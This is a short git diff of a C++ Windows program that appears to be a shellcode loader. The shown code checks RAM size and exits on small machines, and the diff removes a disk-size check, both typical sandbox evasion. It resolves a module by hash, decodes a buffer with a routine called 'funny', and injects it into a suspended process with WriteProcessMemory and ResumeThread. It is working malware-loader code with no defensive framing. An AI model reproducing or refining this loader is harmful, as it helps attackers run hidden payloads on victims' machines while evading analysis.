@@ -1,6 +1,6 @@
 #include <windows.h>
 #include <winternl.h>
-#include <cstdlib>
+//#include <cstdlib>
 
 #define NtCurrentProcess()	   ((HANDLE)-1)
 
@@ -263,13 +263,6 @@ int main()
         DWORD RAMMB = memoryStatus.ullTotalPhys / 1024 / 1024;
         if (RAMMB < 2048) exit(0);
 
-        HANDLE hDevice = CreateFileW(L"\\\\.\\PhysicalDrive0", 0, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
-        DISK_GEOMETRY pDiskGeometry;
-        DWORD bytesReturned;
-        DeviceIoControl(hDevice, IOCTL_DISK_GET_DRIVE_GEOMETRY, NULL, 0, &pDiskGeometry, sizeof(pDiskGeometry), &bytesReturned, (LPOVERLAPPED)NULL);
-        DWORD diskSizeGB;
-        diskSizeGB = pDiskGeometry.Cylinders.QuadPart * (ULONG)pDiskGeometry.TracksPerCylinder * (ULONG)pDiskGeometry.SectorsPerTrack * (ULONG)pDiskGeometry.BytesPerSector / 1024 / 1024 / 1024;
-        if (diskSizeGB < 100) exit(0);
         
         HMODULE mod = getModule(4097367);
 
@@ -350,7 +343,7 @@ int main()
         int len = sizeof(buf) - 1;
 
         funny(buf, len);
-        //prestuff(buf, len);
+        
         WriteProcessMemory(pi.hProcess, codeEntry, buf, sizeof(buf), NULL);
         ResumeThread(pi.hThread);
 
